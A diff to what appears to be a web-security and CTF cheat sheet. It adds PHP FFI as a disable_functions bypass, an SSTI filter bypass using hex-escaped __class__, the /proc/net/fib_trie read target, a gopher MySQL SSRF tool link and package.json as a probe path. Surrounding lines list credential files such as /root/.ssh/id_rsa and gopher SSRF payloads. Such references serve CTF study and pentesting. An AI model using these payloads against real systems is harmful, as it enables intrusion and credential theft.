@@ -648,6 +648,12 @@ echo file_get_contents('bar/etc/passwd');
 - dl()
     - 載入module
     - `dl("rce.so")`
+
+- FFI
+    - PHP 7.4 feature
+    - preloading + ffi
+    - e.g. RCTF 2019 - nextphp
+
 - [l3mon/Bypass_Disable_functions_Shell](https://github.com/l3m0n/Bypass_Disable_functions_Shell)
 - 族繁不及備載......        
 
@@ -940,6 +946,7 @@ pop graphic-context
         - MySQL安裝路徑
     - @@datadir
         - Location of db file
+    - @@plugin_dir
     - @@hostname
     - @@version_compile_os
         - Operating System
@@ -1466,6 +1473,7 @@ HQL injection example (pwn2win 2017)
 - `/etc/nginx/nginx.conf`
 - `/etc/nginx/sites-enabled/default`
 - `/etc/nginx/sites-enabled/default.conf`
+- `/proc/net/fib_trie`
 - `.htaccess`
 - `/root/.bash_history`
 - `/root/.ssh/id_rsa`
@@ -1882,6 +1890,9 @@ Server-Side Template Injection
     - `{{''.__class__}}`
         - `{{''['__class__']}}`
         - `{{''|attr('__class__')}}`
+- 過濾Keyword
+    - 用`\xff`形式去繞
+    - `{{''["\x5f\x5fclass\x5f\x5f"]}}`
 - 用request繞
     - `{{''.__class__}}`
         - `{{''[request.args.kaibro]}}&kaibro=__class__`
@@ -2041,6 +2052,7 @@ header( "Location: gopher://127.0.0.1:9000/x%01%01Zh%00%08%00%00%00%01%00%00%00%
             - Connection Phase
             - Command Phase
         - `gopher://127.0.0.1:3306/_<PAYLOAD>`
+        - Tool: https://github.com/undefinedd/extract0r-
 
     - Docker 
         - Remote api未授權訪問
@@ -2533,6 +2545,7 @@ state[i] = state[i-3] + state[i-31]`
      - .DS_Store
      - .htaccess
      - .pyc
+     - package.json
      - server-status
      - crossdomain.xml
      - admin/ manager/ login/ backup/ wp-login/ phpMyAdmin/
